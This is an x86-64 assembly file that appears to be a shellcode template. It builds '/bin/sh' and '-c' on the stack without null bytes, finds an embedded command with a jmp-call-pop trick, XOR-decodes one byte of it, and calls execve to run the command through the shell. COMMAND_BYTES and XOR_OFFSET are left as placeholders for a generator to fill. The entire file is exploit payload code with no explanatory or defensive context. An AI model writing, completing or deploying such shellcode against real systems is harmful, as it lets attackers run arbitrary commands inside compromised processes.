bits 64

section .text
global _start

_start:
    xor rcx, rcx
    push rcx
    mov rcx, 0x68732f6e69622fff
    shr rcx, 8
    push rcx
    push rsp
    pop rdi

    xor rcx, rcx
    push rcx
    push word 0x632d
    push rsp
    pop rbx

    xor rcx, rcx
    push rcx
    jmp command

execve:
    pop rdx
    mov rax, [rdx] ; db "COMMAND_BYTES"
    shr rax, 8*7
    add rdx, 8
    push rdx
    xor byte [rdx+"XOR_OFFSET"], 0x0a
    xor rcx, rcx 
    push rcx 
    push rdx
    push rbx
    push rdi
    push rsp
    pop rsi

    xor rax, rax
    mov al, 59
    xor rdx, rdx
    syscall

command:
    call execve
    
data: 
    db "COMMAND_BYTES"
    db "XOR_OFFSET"